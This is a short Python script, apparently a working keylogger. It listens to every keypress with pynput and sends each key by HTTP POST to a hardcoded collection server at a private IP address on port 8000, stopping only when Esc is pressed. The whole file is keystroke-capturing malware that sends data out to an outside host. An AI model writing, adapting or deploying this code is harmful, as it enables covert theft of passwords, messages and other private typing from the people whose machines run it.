from pynput.keyboard import Key,Listener
import json
import requests
url = 'http://10.138.130.72:8000/keylogger'

def on_press(key):
    key = str(key)
    myresponse = requests.post(url, json = {"key": key})
    print("pressed : ",key)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()